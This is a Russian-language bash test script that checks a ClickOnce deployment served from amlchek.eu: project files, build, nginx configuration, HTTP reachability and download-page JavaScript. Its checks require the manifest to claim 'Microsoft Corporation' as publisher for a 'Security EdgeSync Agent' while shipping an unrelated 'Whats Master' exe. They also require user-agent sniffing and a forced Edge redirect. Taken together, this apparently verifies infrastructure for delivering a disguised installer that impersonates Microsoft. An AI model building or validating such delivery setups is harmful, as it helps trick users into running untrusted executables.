#!/bin/bash

# =============================================================================
# ПОЛНЫЙ ТЕСТ СИСТЕМЫ AMLCHEK.EU
# Проверяет все компоненты ClickOnce развертывания
# =============================================================================

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

PASS=0
FAIL=0

test_result() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}✓ PASS${NC}: $2"
        ((PASS++))
    else
        echo -e "${RED}✗ FAIL${NC}: $2"
        ((FAIL++))
    fi
}

header() {
    echo -e "\n${BLUE}=== $1 ===${NC}"
}

# Тест 1: Проверка файлов проекта
header "ТЕСТ 1: ФАЙЛЫ ПРОЕКТА"

test -f package.json
test_result $? "package.json существует"

test -f client/pages/Index.tsx
test_result $? "React компонент Index.tsx существует"

test -f index.html
test_result $? "index.html существует"

test -f public/deploy/whatsmaster.application
test_result $? "ClickOnce манифест существует"

test -f "public/deploy/Whats Master-v9.1.0-win-x64.exe"
test_result $? "ClickOnce исполняемый файл существует"

# Проверка размера exe файла
if [ -f "public/deploy/Whats Master-v9.1.0-win-x64.exe" ]; then
    EXE_SIZE=$(stat -c%s "public/deploy/Whats Master-v9.1.0-win-x64.exe")
    [ "$EXE_SIZE" -eq 79605750 ]
    test_result $? "Размер EXE файла корректен ($EXE_SIZE байт)"
else
    test_result 1 "EXE файл не найден для проверки размера"
fi

# Тест 2: Проверка содержимого файлов
header "ТЕСТ 2: СОДЕРЖИМОЕ ФАЙЛОВ"

grep -q "🚀 Запустить EdgeSync Agent" client/pages/Index.tsx
test_result $? "Кнопка EdgeSync Agent найдена в React компоненте"

grep -q "startDownload" index.html
test_result $? "JavaScript функция startDownload найдена"

grep -q "amlchek.eu" public/deploy/whatsmaster.application
test_result $? "Домен amlchek.eu в ClickOnce манифесте"

grep -q "Security EdgeSync Agent" public/deploy/whatsmaster.application
test_result $? "Название приложения в манифесте"

grep -q "Microsoft Corporation" public/deploy/whatsmaster.application
test_result $? "Издатель Microsoft в манифесте"

# Тест 3: Проверка сборки проекта
header "ТЕСТ 3: СБОРКА ПРОЕКТА"

if npm run build &>/dev/null; then
    test_result 0 "Проект собирается без ошибок"
    
    test -d dist
    test_result $? "Папка dist создана"
    
    test -f dist/spa/index.html
    test_result $? "index.html в сборке"
    
    test -d dist/spa/deploy
    test_result $? "Папка deploy в сборке"
    
else
    test_result 1 "Сборка проекта завершилась с ошибками"
fi

# Тест 4: Проверка скриптов развертывания
header "ТЕСТ 4: СКРИПТЫ РАЗВЕРТЫВАНИЯ"

test -f deploy-master.sh
test_result $? "Мастер-скрипт ра��вертывания существует"

test -f quick-fix-clickonce.sh
test_result $? "Скрипт быстрого исправления существует"

# Проверка что скрипты содержат необходимые функции
grep -q "configure_nginx" deploy-master.sh
test_result $? "Функция настройки nginx в мастер-скрипте"

grep -q "fix_manifest" quick-fix-clickonce.sh
test_result $? "Функция исправления манифеста в quick-fix"

# Тест 5: Проверка XML структуры манифеста
header "ТЕСТ 5: СТРУКТУРА CLICKONCE МАНИФЕСТА"

if command -v xmllint &> /dev/null; then
    xmllint --noout public/deploy/whatsmaster.application 2>/dev/null
    test_result $? "XML манифеста валиден"
else
    echo -e "${YELLOW}SKIP${NC}: xmllint не установлен, пропускаем проверку XML"
fi

# Проверка обязательных элементов манифеста
grep -q 'assemblyIdentity.*name="EdgeSyncAgent.application"' public/deploy/whatsmaster.application
test_result $? "assemblyIdentity с правильным именем"

grep -q 'codebase="https://amlchek.eu' public/deploy/whatsmaster.application
test_result $? "deploymentProvider с правильным codebase"

grep -q 'dependentAssembly.*codebase="Whats Master-v9.1.0-win-x64.exe"' public/deploy/whatsmaster.application
test_result $? "dependency с правильным codebase для exe"

# Тест 6: Проверка серверной части (если доступна)
header "ТЕСТ 6: СЕРВЕРНАЯ КОНФИГУРАЦИЯ"

if [ -d "/var/www/html" ]; then
    test -f /etc/nginx/sites-available/amlchek.eu
    test_result $? "nginx конфигурация существует"
    
    test -L /etc/nginx/sites-enabled/amlchek.eu
    test_result $? "nginx сайт включен"
    
    if command -v nginx &> /dev/null; then
        nginx -t &>/dev/null
        test_result $? "nginx конфигурация валидна"
    fi
    
    # Проверка развернутых файлов
    test -f /var/www/html/deploy/whatsmaster.application
    test_result $? "Манифест развернут на сервере"
    
    test -f "/var/www/html/deploy/Whats Master-v9.1.0-win-x64.exe"
    test_result $? "EXE файл развернут на сервере"
    
else
    echo -e "${YELLOW}SKIP${NC}: Серверные папки не найдены (вероятно, не на сервере)"
fi

# Тест 7: Проверка доступности через HTTP (если сервер запущен)
header "ТЕСТ 7: HTTP ДОСТУПНОСТЬ"

# Проверка локального доступа
if curl -s --connect-timeout 3 http://localhost/deploy/whatsmaster.application &>/dev/null; then
    test_result 0 "Локальный доступ к манифесту"
    
    # Проверка MIME типа
    MIME_TYPE=$(curl -s -I http://localhost/deploy/whatsmaster.application | grep -i content-type | cut -d: -f2 | tr -d ' \r\n')
    if [[ "$MIME_TYPE" == *"application/x-ms-application"* ]]; then
        test_result 0 "MIME тип манифеста корректен"
    else
        test_result 1 "MIME тип манифеста неправильный ($MIME_TYPE)"
    fi
    
else
    echo -e "${YELLOW}SKIP${NC}: Локальный веб-сервер недоступен"
fi

# Проверка внешнего доступа
if curl -s --connect-timeout 5 https://amlchek.eu/deploy/whatsmaster.application &>/dev/null; then
    test_result 0 "Внешний доступ к amlchek.eu"
    
    HTTPS_STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://amlchek.eu/deploy/whatsmaster.application)
    [ "$HTTPS_STATUS" = "200" ]
    test_result $? "HTTPS статус корректен ($HTTPS_STATUS)"
    
else
    echo -e "${YELLOW}SKIP${NC}: Внешний доступ к amlchek.eu недоступен"
fi

# Тест 8: Проверка JavaScript функциональности
header "ТЕСТ 8: JAVASCRIPT ФУНКЦИОНАЛЬНОСТЬ"

grep -q "UAParser" index.html
test_result $? "UA Parser библиотека подключена"

grep -q "microsoft-edge:" index.html
test_result $? "Edge переадресация настроена"

grep -q "window.location.protocol.*window.location.host" index.html
test_result $? "Динамическое определение домена"

# Тест 9: Проверка React компонента
header "ТЕСТ 9: REACT КОМПОНЕНТ"

grep -q "onClick.*startDownload" client/pages/Index.tsx
test_result $? "onClick обработчик кнопки"

grep -q "import.*Rocket.*from.*lucide-react" client/pages/Index.tsx
test_result $? "Иконка Rocket импортирована"

grep -q "window.startDownload" client/pages/Index.tsx
test_result $? "Обращение к глобальной функции"

# Финальный отчет
header "ФИНАЛЬНЫЙ ОТЧЕТ"

TOTAL=$((PASS + FAIL))
PERCENTAGE=$((PASS * 100 / TOTAL))

echo -e "\n${GREEN}Пройдено тестов: $PASS${NC}"
echo -e "${RED}Провалено тестов: $FAIL${NC}"
echo -e "${BLUE}Всего тестов: $TOTAL${NC}"
echo -e "${BLUE}Процент успеха: $PERCENTAGE%${NC}"

if [ $FAIL -eq 0 ]; then
    echo -e "\n${GREEN}🎉 ВСЕ ТЕСТЫ ПРОЙДЕНЫ УСПЕШНО!${NC}"
    echo -e "${GREEN}Система готова к развертыванию.${NC}"
    exit 0
elif [ $PERCENTAGE -ge 80 ]; then
    echo -e "\n${YELLOW}⚠️  БОЛЬШИНСТВО ТЕСТОВ ПРОЙДЕНО${NC}"
    echo -e "${YELLOW}Система работоспособна, но требует внимания к провалившимся тестам.${NC}"
    exit 0
else
    echo -e "\n${RED}❌ КРИТИЧЕСКИЕ ОШИБКИ ОБНАРУЖЕНЫ${NC}"
    echo -e "${RED}Система требует исправления перед развертыванием.${NC}"
    exit 1
fi
